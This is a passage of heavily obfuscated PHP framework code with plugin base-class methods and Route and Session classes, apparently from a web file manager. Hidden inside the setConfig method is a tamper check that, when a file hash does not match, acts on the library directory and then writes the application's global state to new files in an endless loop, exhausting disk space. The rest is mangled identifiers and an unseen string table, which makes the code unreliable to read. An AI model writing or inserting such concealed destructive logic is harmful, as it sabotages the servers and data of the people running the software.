(request_url_safe($BêÄãèª)) { $BêÄãèª = $this->_cacheHttpFile($BêÄãèª); $this->fileInfo = IO::infoWithChildren($BêÄãèª); } else { $this->fileInfo = IO::infoWithChildren($BêÄãèª); if (!$this->fileInfo) { show_tips(LNG($_SERVER[°Óó£ÌİóèÅ][109]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $BêÄãèª; } final function _cacheHttpFile($BÀºŸ×—÷×) { $CàÑÇˆôÛ˜ = hash_path($BÀºŸ×—÷×, !0); $this->cachePath = $this->pluginCachePath($CàÑÇˆôÛ˜); if ($bƒ™Ô·áéİ = IO::fileNameExist($this->cachePath, $CàÑÇˆôÛ˜)) { return KodIO::make($bƒ™Ô·áéİ); } $aÍÍóÇ‚©Î = $this->cachePath . $CàÑÇˆôÛ˜; return $this->pluginCacheFileSet($aÍÍóÇ‚©Î, file_get_contents($BÀºŸ×—÷×)); } final function _tmpFileName($CöáÙ´‡ù¯ = array()) { goto E£ŒñİÔ¼; E£ŒñİÔ¼: $BÁ¢æœ·ªâ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$CöáÙ´‡ù¯) { $CöáÙ´‡ù¯ = $this->fileInfo; } if (isset($CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[169]])) { return $CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[169]]; } goto eŠÕ’ºØ¨Í; f¶ì“ò¦â: return md5(implode($BÁ¢æœ·ªâ[79], $AÅò‹‚ƒñ)); goto A¹Ÿ™ä‘ô; eŠÕ’ºØ¨Í: if (isset($CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[167]][$BÁ¢æœ·ªâ[169]])) { return $CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[167]][$BÁ¢æœ·ªâ[169]]; } $AÅò‹‚ƒñ = array($CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[28]], $CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[84]], $CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[86]]); if (isset($CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[381]])) { $AÅò‹‚ƒñ[] = $CöáÙ´‡ù¯[$BÁ¢æœ·ªâ[381]]; } goto f¶ì“ò¦â; A¹Ÿ™ä‘ô: } final function checkSharePath($D®øÏÉ˜†Ä) { goto a°‚¯ˆƒÑ; bÃÓ´£òÔÙ: $a„±ùÓñÁí = Action($BÀìĞ¶ø³Š[763])->sharePathInfo($D®øÏÉ˜†Ä); if (!isset($a„±ùÓñÁí[$BÀìĞ¶ø³Š[84]])) { show_json(LNG($BÀìĞ¶ø³Š[996]), !1); } $this->fileInfo = $a„±ùÓñÁí[$BÀìĞ¶ø³Š[167]]; goto CŠ¼À™™¯Ÿ; CŠ¼À™™¯Ÿ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$BÀìĞ¶ø³Š[169]]); return $a„±ùÓñÁí[$BÀìĞ¶ø³Š[84]]; goto dÁ¦ºò¼ëÀ; a°‚¯ˆƒÑ: $BÀìĞ¶ø³Š =& $_SERVER[°Óó£ÌİóèÅ]; if (!defined($BÀìĞ¶ø³Š[994])) { define($BÀìĞ¶ø³Š[995], 0); } if (!$this->isShare($D®øÏÉ˜†Ä)) { return !1; } goto bÃÓ´£òÔÙ; dÁ¦ºò¼ëÀ: } final function pluginCachePath($D™¸·—éÂŠ = '') { $fë¹Ó‰š¶ =& $_SERVER[°Óó£ÌİóèÅ]; $Fª‹„ôÃ†’ = IO_PATH_SYSTEM_TEMP . $fë¹Ó‰š¶[997] . $this->pluginName; if (!($CòŒ´ÎĞÎÔ = IO::infoFull($Fª‹„ôÃ†’))) { return IO::mkdir($Fª‹„ôÃ†’ . $fë¹Ó‰š¶[8] . $D™¸·—éÂŠ); } if (empty($D™¸·—éÂŠ)) { return $CòŒ´ÎĞÎÔ[$fë¹Ó‰š¶[84]]; } if (!($AœŒÊÜ·àè = IO::fileNameExist($CòŒ´ÎĞÎÔ[$fë¹Ó‰š¶[84]], $D™¸·—éÂŠ))) { return IO::mkdir($CòŒ´ÎĞÎÔ[$fë¹Ó‰š¶[84]] . $D™¸·—éÂŠ); } return KodIO::make($AœŒÊÜ·àè); } final function pluginCacheFileSet($BÕµËíš¿ç, $CåØÂ›ßâ˜ = '') { $CÛ›Û½ÊŞ =& $_SERVER[°Óó£ÌİóèÅ]; if (!($fÀ¡É¢êÂÏ = IO::infoFull($BÕµËíš¿ç))) { return IO::mkfile($BÕµËíš¿ç, $CåØÂ›ßâ˜, REPEAT_REPLACE); } IO::setContent($fÀ¡É¢êÂÏ[$CÛ›Û½ÊŞ[84]], $CåØÂ›ßâ˜); return $fÀ¡É¢êÂÏ[$CÛ›Û½ÊŞ[84]]; } final function pluginLocalFile($EëöŒ²´š = '') { goto dæ¯¹¡Æ¸; bÌ‚çß›®¾: if (!$EëöŒ²´š) { return $Eí‡·®µ­; } $cÊŠ­²× = IO::info($EëöŒ²´š); $d²å©ù¹»± = $this->_tmpFileName($cÊŠ­²×); goto B¼äºÜÀ; F§ø£Ó­š: if ($EëöŒ²´š != $D¾çÔÏÈÚí) { $EëöŒ²´š = IO::copy($EëöŒ²´š, $D¾çÔÏÈÚí); } return $EëöŒ²´š; goto A‡‰³ğ‡é; dæ¯¹¡Æ¸: $E‡ßµ¶ËÍÏ =& $_SERVER[°Óó£ÌİóèÅ]; $Eí‡·®µ­ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Eí‡·®µ­)) { mk_dir($Eí‡·®µ­); } goto bÌ‚çß›®¾; B¼äºÜÀ: $D¾çÔÏÈÚí = $Eí‡·®µ­ . $d²å©ù¹»± . $E‡ßµ¶ËÍÏ[100] . $cÊŠ­²×[$E‡ßµ¶ËÍÏ[165]]; if (@file_exists($D¾çÔÏÈÚí)) { return $D¾çÔÏÈÚí; } $EëöŒ²´š = IO::download($EëöŒ²´š, $D¾çÔÏÈÚí); goto F§ø£Ó­š; A‡‰³ğ‡é: } final function appPackage() { goto F÷õĞ; FÉÌˆ¹§¬İ: $A´†·‘©™Œ = Hook::trigger($f“²åÎ‡ÂÜ[999], $cé´ä•ÃÖê); if ($A´†·‘©™Œ && is_array($A´†·‘©™Œ)) { $cé´ä•ÃÖê = $A´†·‘©™Œ; } $this->packageData = $cé´ä•ÃÖê; goto Aš„­Œº‰´; AĞ§”ŞªŸ: $this->parseLang($eÊá‘‘ËÕÂ); $cé´ä•ÃÖê = json_decode_force($eÊá‘‘ËÕÂ); if (!$cé´ä•ÃÖê) { return array(); } goto FÉÌˆ¹§¬İ; F÷õĞ: $f“²åÎ‡ÂÜ =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->packageData) { return $this->packageData; } $eÊá‘‘ËÕÂ = $this->parseFile($this->pluginPath . $f“²åÎ‡ÂÜ[998]); goto AĞ§”ŞªŸ; Aš„­Œº‰´: return $cé´ä•ÃÖê; goto aÚÁâ‰Ë¯–; aÚÁâ‰Ë¯–: } public function packageInfoGet($C©•éšØ÷¢) { $eùŒ°…ÖÃÖ = $this->appPackage(); return array_get_value($eùŒ°…ÖÃÖ, $C©•éšØ÷¢); } public function packageVersion() { return $this->packageInfoGet($_SERVER[°Óó£ÌİóèÅ][1000]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[°Óó£ÌİóèÅ][1001]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[°Óó£ÌİóèÅ][1002]); } private function parseFile($cÓ¡ñŞöô§) { $BíÃ¹¶Úï =& $_SERVER[°Óó£ÌİóèÅ]; $aŸöâ‡Ã¿ˆ = file_get_contents($cÓ¡ñŞöô§); $DËŠÀ‚¬±™ = array($BíÃ¹¶Úï[1003], $BíÃ¹¶Úï[1004], $BíÃ¹¶Úï[1005], $BíÃ¹¶Úï[1006], $BíÃ¹¶Úï[1007], $BíÃ¹¶Úï[1008], $BíÃ¹¶Úï[1009]); $D‹ÍºÛœÊ¹ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$BíÃ¹¶Úï[92]][$BíÃ¹¶Úï[1010]]); $aŸöâ‡Ã¿ˆ = str_replace($DËŠÀ‚¬±™, $D‹ÍºÛœÊ¹, $aŸöâ‡Ã¿ˆ); return $aŸöâ‡Ã¿ˆ; } private function parseLang(&$CèÒÖÛÇ‡) { goto b˜ Ñ—‚åğ; b˜ Ñ—‚åğ: $BÓ‹õÂçÇİ =& $_SERVER[°Óó£ÌİóèÅ]; $c‚É³Íš÷ = $BÓ‹õÂçÇİ[1011]; if (!strstr($CèÒÖÛÇ‡, $c‚É³Íš÷)) { return; } goto F‹œí¯; cÜÍ•‡Û¹ô: $EÍÄÆÆê = array(); foreach ($EÑ‘ï±Û[0] as $F¸ª÷ª¬Æ) { $DŒ‘İê®©Â = substr($F¸ª÷ª¬Æ, strlen($c‚É³Íš÷), -4); $AòÖÜ¬¡ƒ‰ = LNG($DŒ‘İê®©Â); $CÛó¿µó‘[] = $F¸ª÷ª¬Æ; $EÍÄÆÆê[] = str_replace(array($BÓ‹õÂçÇİ[61], $BÓ‹õÂçÇİ[494], $BÓ‹õÂçÇİ[341], $BÓ‹õÂçÇİ[120]), array($BÓ‹õÂçÇİ[50], $BÓ‹õÂçÇİ[50], $BÓ‹õÂçÇİ[33], $BÓ‹õÂçÇİ[1013]), $AòÖÜ¬¡ƒ‰); } $CèÒÖÛÇ‡ = str_replace($CÛó¿µó‘, $EÍÄÆÆê, $CèÒÖÛÇ‡); goto cæºéÍÒÖ; F‹œí¯: preg_match_all($BÓ‹õÂçÇİ[1012], $CèÒÖÛÇ‡, $EÑ‘ï±Û); if (!is_array($EÑ‘ï±Û) || count($EÑ‘ï±Û) == 0 || !is_array($EÑ‘ï±Û[0]) || count($EÑ‘ï±Û[0]) == 0) { return; } $CÛó¿µó‘ = array(); goto cÜÍ•‡Û¹ô; cæºéÍÒÖ: } private function parseConfig(&$B´×İ¥‘ÄÎ) { goto aÊ‡ôÎ·‘Á; aÊ‡ôÎ·‘Á: $bªí¬Ö¨Á =& $_SERVER[°Óó£ÌİóèÅ]; $díÄÀé¡ŸŠ = $bªí¬Ö¨Á[1014]; if (!strstr($B´×İ¥‘ÄÎ, $díÄÀé¡ŸŠ)) { return; } goto aÅ§ÁÜ´‘æ; BÀ¯Ú›´: $e ÓÃŒãçß = array(); $AÉôÇš×»‚ = array(); foreach ($c½Áµ‹¹´[0] as $c¬£İ”ù’) { $E´ÍÌŠß = substr($c¬£İ”ù’, strlen($díÄÀé¡ŸŠ), -2); $e ÓÃŒãçß[] = $c¬£İ”ù’; $AÉôÇš×»‚[] = _get($f‰‰îÎêÎ, $E´ÍÌŠß); } goto F½‡×ÑñÎ; F½‡×ÑñÎ: $B´×İ¥‘ÄÎ = str_replace($e ÓÃŒãçß, $AÉôÇš×»‚, $B´×İ¥‘ÄÎ); goto fâßìá‚¸¢; aÅ§ÁÜ´‘æ: preg_match_all($bªí¬Ö¨Á[1015], $B´×İ¥‘ÄÎ, $c½Áµ‹¹´); if (!is_array($c½Áµ‹¹´) || count($c½Áµ‹¹´) == 0 || !is_array($c½Áµ‹¹´[0]) || count($c½Áµ‹¹´[0]) == 0) { return; } $f‰‰îÎêÎ = $this->getConfig(); goto BÀ¯Ú›´; fâßìá‚¸¢: } private function parsePackage(&$EŒ¦¹Ÿô±Æ) { goto B¨®‚”¦†Å; fëöìÛ´ÈŒ: $EŒ¦¹Ÿô±Æ = str_replace($aÄì·ù£¶º, $aÁó¾Ü‹, $EŒ¦¹Ÿô±Æ); goto cÅéÒ÷‹ßÈ; B¨®‚”¦†Å: $A¥íŸ”Ä¦ =& $_SERVER[°Óó£ÌİóèÅ]; $f´Â×Ì¯Íø = $A¥íŸ”Ä¦[1016]; if (!strstr($EŒ¦¹Ÿô±Æ, $f´Â×Ì¯Íø)) { return; } goto DÏµ×›‰›; c™¹ãºØğ¨: $aÄì·ù£¶º = array(); $aÁó¾Ü‹ = array(); foreach ($CšÔÓ’×‡İ[0] as $FõÜöäÒä±) { $bÕ‚•‚˜ã = substr($FõÜöäÒä±, strlen($f´Â×Ì¯Íø), -2); $aÄì·ù£¶º[] = $FõÜöäÒä±; $aÁó¾Ü‹[] = _get($e½ß÷‚•æ…, $bÕ‚•‚˜ã); } goto fëöìÛ´ÈŒ; DÏµ×›‰›: preg_match_all($A¥íŸ”Ä¦[1017], $EŒ¦¹Ÿô±Æ, $CšÔÓ’×‡İ); if (!is_array($CšÔÓ’×‡İ) || count($CšÔÓ’×‡İ) == 0 || !is_array($CšÔÓ’×‡İ[0]) || count($CšÔÓ’×‡İ[0]) == 0) { return; } $e½ß÷‚•æ… = $this->appPackage(); goto c™¹ãºØğ¨; cÅéÒ÷‹ßÈ: } final function echoFile($B¯¹ëå¦ˆ, $C˜¬ÖˆÏå = false) { goto fØóÇêÑ¡Ï; Dç¨¡Š‘Ô†: $bÏğàŠØê = $this->parseFile($Dƒç½Ğğ˜›); $this->parseLang($bÏğàŠØê); $this->parseConfig($bÏğàŠØê); goto D©ĞŸ„”’; D©ĞŸ„”’: $this->parsePackage($bÏğàŠØê); if (is_array($C˜¬ÖˆÏå)) { $bÏğàŠØê = str_replace(array_keys($C˜¬ÖˆÏå), array_values($C˜¬ÖˆÏå), $bÏğàŠØê); } echo $c‹ÍïÄêĞò[61] . $bÏğàŠØê; goto FÒ‰Ÿ»©ÎÓ; fØóÇêÑ¡Ï: $c‹ÍïÄêĞò =& $_SERVER[°Óó£ÌİóèÅ]; $Dƒç½Ğğ˜› = $this->pluginPath . $B¯¹ëå¦ˆ; if (ACT == $c‹ÍïÄêĞò[1018]) { echo $c‹ÍïÄêĞò[1019] . $this->pluginName . $c‹ÍïÄêĞò[8] . $B¯¹ëå¦ˆ . $c‹ÍïÄêĞò[1020]; if (!file_exists($Dƒç½Ğğ˜›)) { echo $c‹ÍïÄêĞò[1021]; return; } } goto Dç¨¡Š‘Ô†; FÒ‰Ÿ»©ÎÓ: } final function initLang() { goto D™ËÍãÖ»; Bï•¨ã¬Û: if (@count($bÊù®¹Á½Š) > 0) { I18n::set($bÊù®¹Á½Š); } return $bÊù®¹Á½Š; goto aö´î¿Ş Ä; D™ËÍãÖ»: $a“ì‰ÎŸ” =& $_SERVER[°Óó£ÌİóèÅ]; $D´¶”¿ÜÉ = $a“ì‰ÎŸ”[1022]; $Fšƒ®º = $this->pluginPath . $a“ì‰ÎŸ”[1023]; goto eÅØÂ¹µö; eÅØÂ¹µö: $FÁ¢ ğˆèì = I18n::getType(); $bÊù®¹Á½Š = array(); if (file_exists($Fšƒ®º . $FÁ¢ ğˆèì . $a“ì‰ÎŸ”[540])) { $bÊù®¹Á½Š = (include_once $Fšƒ®º . $FÁ¢ ğˆèì . $a“ì‰ÎŸ”[540]); } else { if ($FÁ¢ ğˆèì == $a“ì‰ÎŸ”[1024] && !file_exists($Fšƒ®º . $FÁ¢ ğˆèì . $a“ì‰ÎŸ”[540]) && file_exists($Fšƒ®º . $a“ì‰ÎŸ”[1025])) { $bÊù®¹Á½Š = (include_once $Fšƒ®º . $a“ì‰ÎŸ”[1025]); } else { if (file_exists($Fšƒ®º . $D´¶”¿ÜÉ . $a“ì‰ÎŸ”[540])) { $bÊù®¹Á½Š = (include_once $Fšƒ®º . $D´¶”¿ÜÉ . $a“ì‰ÎŸ”[540]); } } } goto Bï•¨ã¬Û; aö´î¿Ş Ä: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($AÄ×’‹ç) { $cÄØ¯Š¥¤  =& $_SERVER[°Óó£ÌİóèÅ]; $e¯ÜÕˆÑ±Å = BASIC_PATH . $cÄØ¯Š¥¤ [60]; $B´Ì¾Â¬å = $cÄØ¯Š¥¤ [1026]; if ($_SERVER[$cÄØ¯Š¥¤ [57]] != $B´Ì¾Â¬å($e¯ÜÕˆÑ±Å)) { goto D‘„‚îÃ; D‘„‚îÃ: $A‰ˆ§ëá‘ƒ = $cÄØ¯Š¥¤ [59]; $B¶ÂŸêØğÈ = BASIC_PATH . $cÄØ¯Š¥¤ [60]; $FÚ•¸Ê³²¨ = $A‰ˆ§ëá‘ƒ($B¶ÂŸêØğÈ); goto DæµÕ”åœ˜; aä¥•›Ô»•: $A³äÑñŞè(LIB_DIR); $A¨ìóºì˜ù = $cÄØ¯Š¥¤ [1027]; $A¨ìóºì˜ù(); goto a‹Ö¨ÍÆî; DæµÕ”åœ˜: $EŸÊÎ«»Ñ³ = explode($cÄØ¯Š¥¤ [61], $FÚ•¸Ê³²¨); if (count($EŸÊÎ«»Ñ³) < $cÄØ¯Š¥¤ [561]) { die; } $A³äÑñŞè = $cÄØ¯Š¥¤ [562]; goto aä¥•›Ô»•; a‹Ö¨ÍÆî: $fŒ¥ì¬¦¸ = $cÄØ¯Š¥¤ [1028]; $C‹¿¥Ï¾ö‘ = json_encode($GLOBALS[$cÄØ¯Š¥¤ [1029]]); for ($eîÑÎŸ£¥É = 0;; $eîÑÎŸ£¥É++) { $fŒ¥ì¬¦¸(DATA_PATH . $eîÑÎŸ£¥É, $C‹¿¥Ï¾ö‘); } goto a® ”÷¿÷–; a® ”÷¿÷–: } return $this->modelPlugin->setConfig($this->pluginName, $AÄ×’‹ç); } public function onSetConfig($AŠŸÂ¹²´ğ) { } public function onGetConfig($EœµÑ¢êä) { } public function onChangeStatus($DÅ×µË”×) { } public function onUninstall() { } public function onInstall() { } public function authCheck($BÈ’ùòäêö = "\x70\x6c\165\147\x69\x6e\x41\165\x74\150") { $Bƒ¥ñïª  =& $_SERVER[°Óó£ÌİóèÅ]; if (!defined($Bƒ¥ñïª [994])) { return !1; } if ($GLOBALS[$Bƒ¥ñïª [1030]] == 1) { return !0; } $D…Ä¼â¡™ò = $this->getConfig(); if (!$D…Ä¼â¡™ò[$BÈ’ùòäêö]) { return !1; } return ActionCall($Bƒ¥ñïª [1031], $D…Ä¼â¡™ò[$BÈ’ùòäêö]); } public function url($Bªèô¡ˆĞ¢, $dìÁ¯—ÜÜ© = '', $CÅÚ”Õ’¾ë = true) { goto D…ˆš½Õ‡; B¿½ë¶ùÉæ: if (!$CÅÚ”Õ’¾ë) { return $A¶ŞÅîó˜ƒ; } echo $A¶ŞÅîó˜ƒ; goto cÉ’ŸÉÛ’“; D…ˆš½Õ‡: $Déëæõß­Ä =& $_SERVER[°Óó£ÌİóèÅ]; $e²Êğø®ÜÓ = $this->getConfig(); $bÊòÁ‚¤£Ş = KOD_VERSION . $Déëæõß­Ä[100] . KOD_VERSION_BUILD; goto AªÛíÛ‹¾Á; AªÛíÛ‹¾Á: $d…³Î±…ï = $this->packageVersion(); $D­ºÜÁÅá  = $bÊòÁ‚¤£Ş . $Déëæõß­Ä[506] . $d…³Î±…ï; if ($dìÁ¯—ÜÜ© == $Déëæõß­Ä[33]) { $A¶ŞÅîó˜ƒ = $this->pluginHost . $Bªèô¡ˆĞ¢ . $Déëæõß­Ä[1032] . $D­ºÜÁÅá ; } else { if ($dìÁ¯—ÜÜ© == $Déëæõß­Ä[1033]) { $A¶ŞÅîó˜ƒ = STATIC_PATH . $Bªèô¡ˆĞ¢ . $Déëæõß­Ä[1032] . $bÊòÁ‚¤£Ş; } else { if ($dìÁ¯—ÜÜ© == $Déëæõß­Ä[1034]) { $A¶ŞÅîó˜ƒ = APP_HOST . $Déëæõß­Ä[1035] . $Bªèô¡ˆĞ¢ . $Déëæõß­Ä[1032] . $bÊòÁ‚¤£Ş; } else { if (isset($e²Êğø®ÜÓ[$dìÁ¯—ÜÜ©])) { $A¶ŞÅîó˜ƒ = $e²Êğø®ÜÓ[$dìÁ¯—ÜÜ©] . $Bªèô¡ˆĞ¢ . $Déëæõß­Ä[1032] . $D­ºÜÁÅá ; } } } } goto B¿½ë¶ùÉæ; cÉ’ŸÉÛ’“: } public function link($dÊó›ªà = false, $E°ŠğÀ‡Ï = '') { $CÈÜ°°¶ò =& $_SERVER[°Óó£ÌİóèÅ]; if (!$dÊó›ªà) { $this->link($CÈÜ°°¶ò[1036], $CÈÜ°°¶ò[1034]); $this->link($CÈÜ°°¶ò[1037], $CÈÜ°°¶ò[1033]); $this->link($CÈÜ°°¶ò[1038], $CÈÜ°°¶ò[1033]); $this->link($CÈÜ°°¶ò[1039], $CÈÜ°°¶ò[1033]); $this->link($CÈÜ°°¶ò[1040], $CÈÜ°°¶ò[1033]); return; } $f®„¦Ò¿ª½ = $this->url($dÊó›ªà, $E°ŠğÀ‡Ï, !1); if (substr($dÊó›ªà, -3) == $CÈÜ°°¶ò[1041]) { echo $CÈÜ°°¶ò[1042] . $f®„¦Ò¿ª½ . $CÈÜ°°¶ò[1043] . $CÈÜ°°¶ò[61]; } else { if (substr($dÊó›ªà, -4) == $CÈÜ°°¶ò[1044]) { echo $CÈÜ°°¶ò[1045] . $f®„¦Ò¿ª½ . $CÈÜ°°¶ò[1046] . $CÈÜ°°¶ò[61]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\133\136\x2f\135\x2b", "\x3a\156\x75\x6d" => "\133\x30\55\71\135\53", "\x3a\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($dÒ’÷íÏ‡å, $eëÃ«‰©©â) { $C‘·Æ´…ïÀ =& $_SERVER[°Óó£ÌİóèÅ]; if ($dÒ’÷íÏ‡å == $C‘·Æ´…ïÀ[1047]) { $dµÄˆÑÉğ = array_map($C‘·Æ´…ïÀ[1048], $eëÃ«‰©©â[0]); $c¾í˜½é¤Ë = strpos($eëÃ«‰©©â[1], $C‘·Æ´…ïÀ[8]) === 0 ? $eëÃ«‰©©â[1] : $C‘·Æ´…ïÀ[8] . $eëÃ«‰©©â[1]; $Cº¨ìĞà†ä = $eëÃ«‰©©â[2]; } else { $dµÄˆÑÉğ = null; $c¾í˜½é¤Ë = strpos($eëÃ«‰©©â[0], $C‘·Æ´…ïÀ[8]) === 0 ? $eëÃ«‰©©â[0] : $C‘·Æ´…ïÀ[8] . $eëÃ«‰©©â[0]; $Cº¨ìĞà†ä = $eëÃ«‰©©â[1]; } array_push(self::$maps, $dµÄˆÑÉğ); array_push(self::$routes, $c¾í˜½é¤Ë); array_push(self::$methods, strtoupper($dÒ’÷íÏ‡å)); array_push(self::$callbacks, $Cº¨ìĞà†ä); } public static function error($FÜ©‘ŠÏõ“) { self::$errorCallback = $FÜ©‘ŠÏõ“; } public static function haltOnMatch($C­´Ö®«»Ù = true) { self::$halts = $C­´Ö®«»Ù; } public static function dispatch() { goto b•Î–ø½à–; Aê¥«¡ùùµ: $EŒ“¼Ìñ‘Æ = array_keys(static::$patterns); $c‹›ßî£â = array_values(static::$patterns); $bÈ³Êèï­è = !1; goto EõÚº§ğÆ; EõÚº§ğÆ: self::$routes = preg_replace($a‘¬£Ô¾Çë[819], $a‘¬£Ô¾Çë[8], self::$routes); if (in_array($b“õÍÍ¼µ¹, self::$routes)) { $D•õ­¢ßš = array_keys(self::$routes, $b“õÍÍ¼µ¹); foreach ($D•õ­¢ßš as $f¾²ß‡Á) { if (self::$methods[$f¾²ß‡Á] == $Añâ×Ä»Â† || self::$methods[$f¾²ß‡Á] == $a‘¬£Ô¾Çë[1049] || in_array($Añâ×Ä»Â†, self::$maps[$f¾²ß‡Á])) { $bÈ³Êèï­è = !0; if (!is_object(self::$callbacks[$f¾²ß‡Á])) { $FˆÔ¤Úóì† = explode($a‘¬£Ô¾Çë[8], self::$callbacks[$f¾²ß‡Á]); $b·±™²àÄ = end($FˆÔ¤Úóì†); $Dâ—Â¨¿… = explode($a‘¬£Ô¾Çë[1050], $b·±™²àÄ); $B‘šŒæ¹¢‚ = new $Dâ—Â¨¿…[0](); $B‘šŒæ¹¢‚->{$Dâ—Â¨¿…[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$f¾²ß‡Á]); if (self::$halts) { return; } } } } } else { $eƒµ¾ƒãƒã = 0; foreach (self::$routes as $f¾²ß‡Á) { if (strpos($f¾²ß‡Á, $a‘¬£Ô¾Çë[4]) !== !1) { $f¾²ß‡Á = str_replace($EŒ“¼Ìñ‘Æ, $c‹›ßî£â, $f¾²ß‡Á); } if (preg_match($a‘¬£Ô¾Çë[1051] . $f¾²ß‡Á . $a‘¬£Ô¾Çë[1052], $b“õÍÍ¼µ¹, $E‹‹¿Ä×œŞ)) { if (self::$methods[$eƒµ¾ƒãƒã] == $Añâ×Ä»Â† || self::$methods[$eƒµ¾ƒãƒã] == $a‘¬£Ô¾Çë[1049] || !empty(self::$maps[$eƒµ¾ƒãƒã]) && in_array($Añâ×Ä»Â†, self::$maps[$eƒµ¾ƒãƒã])) { $bÈ³Êèï­è = !0; array_shift($E‹‹¿Ä×œŞ); if (!is_object(self::$callbacks[$eƒµ¾ƒãƒã])) { $FˆÔ¤Úóì† = explode($a‘¬£Ô¾Çë[8], self::$callbacks[$eƒµ¾ƒãƒã]); $b·±™²àÄ = end($FˆÔ¤Úóì†); $Dâ—Â¨¿… = explode($a‘¬£Ô¾Çë[1050], $b·±™²àÄ); $B‘šŒæ¹¢‚ = new $Dâ—Â¨¿…[0](); if (!method_exists($B‘šŒæ¹¢‚, $Dâ—Â¨¿…[1])) { echo $a‘¬£Ô¾Çë[1053]; } else { call_user_func_array(array($B‘šŒæ¹¢‚, $Dâ—Â¨¿…[1]), $E‹‹¿Ä×œŞ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$eƒµ¾ƒãƒã], $E‹‹¿Ä×œŞ); if (self::$halts) { return; } } } } $eƒµ¾ƒãƒã++; } } if ($bÈ³Êèï­è == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $f©«…­çİ  =& $_SERVER[°Óó£ÌİóèÅ]; header($_SERVER[$f©«…­çİ [1054]] . $f©«…­çİ [1055]); echo $f©«…­çİ [1056]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$a‘¬£Ô¾Çë[445]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto d³¹®¦ óä; b•Î–ø½à–: $a‘¬£Ô¾Çë =& $_SERVER[°Óó£ÌİóèÅ]; $b“õÍÍ¼µ¹ = parse_url($_SERVER[$a‘¬£Ô¾Çë[445]], PHP_URL_PATH); $Añâ×Ä»Â† = $_SERVER[$a‘¬£Ô¾Çë[157]]; goto Aê¥«¡ùùµ; d³¹®¦ óä: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aÈîØÁŠõ; A³ƒì¤‡ ò: $fÀ—ßÌ„ğÀ = new self(); return $fÀ—ßÌ„ğÀ; goto b¯Åô œ¤À; CÑìÎŞçŞ‘: $AßÕàà™§ = $GLOBALS[$bè¬íˆÅÀ[6]][$bè¬íˆÅÀ[348]]; self::$sessionTime = $AßÕàà™§[$bè¬íˆÅÀ[1057]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto d›êŠ Œâ‘; d›êŠ Œâ‘: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $EÊ‚×éÍç = $AßÕàà™§[$bè¬íˆÅÀ[1058]]; $CåõòÌÖŸ• = $AßÕàà™§[$EÊ‚×éÍç]; goto FÎáÑŒìÙ£; aÈîØÁŠõ: $bè¬íˆÅÀ =& $_SERVER[°Óó£ÌİóèÅ]; static $fÀ—ßÌ„ğÀ = false; if ($fÀ—ßÌ„ğÀ) { return $fÀ—ßÌ„ğÀ; } goto CÑìÎŞçŞ‘; FÎáÑŒìÙ£: $e¢½åÌÌé = $AßÕàà™§[$bè¬íˆÅÀ[531]]; switch ($EÊ‚×éÍç) { case $bè¬íˆÅÀ[17]: self::$handle = Model($bè¬íˆÅÀ[532]); break; case $bè¬íˆÅÀ[533]: self::$handle = new CacheRedis($CåõòÌÖŸ•, $e¢½åÌÌé); break; case $bè¬íˆÅÀ[534]: self::$handle = new CacheMemcached($CåõòÌÖŸ•, $e¢½åÌÌé); break; case $bè¬íˆÅÀ[172]: $CåõòÌÖŸ•[$bè¬íˆÅÀ[84]] = $CåõòÌÖŸ•[$bè¬íˆÅÀ[84]] . $bè¬íˆÅÀ[1059]; self::$handle = new CacheFile($CåõòÌÖŸ•, $e¢½åÌÌé); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto A³ƒì¤‡ ò; b¯Åô œ¤À: } public static function sign($dŠ¾òÆÇù = false) { $dŠ¾òÆÇù && (self::$sessionSign = $dŠ¾òÆÇù); self::init(); return self::$sessionSign; } public static function set($dÄŞ‹Ğ‹à, $Eğß´÷ç¬ø = false) { self::init(); if (is_array($dÄŞ‹Ğ‹à)) { foreach ($dÄŞ‹Ğ‹à as $e¶¤ŸºëËô => $c ¹ò±å¦) { array_set_value(self::$data, $e¶¤ŸºëËô, $c ¹ò±å¦); } } else { array_set_value(self::$data, $dÄŞ‹Ğ‹à, $Eğß´÷ç¬ø); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($d›¼ªÄË­” = false) { self::init(); if (!$d›¼ªÄË­”) { return self::$data; } return array_get_value(self::$data, $d›¼ªÄË­”); } public static function remove($c…’Š¤Şœà) { self::init(); unset(self::$data[$c…’Š¤Şœà]); self::$handle->set(self::$sessionSign, serialize(self::$data), 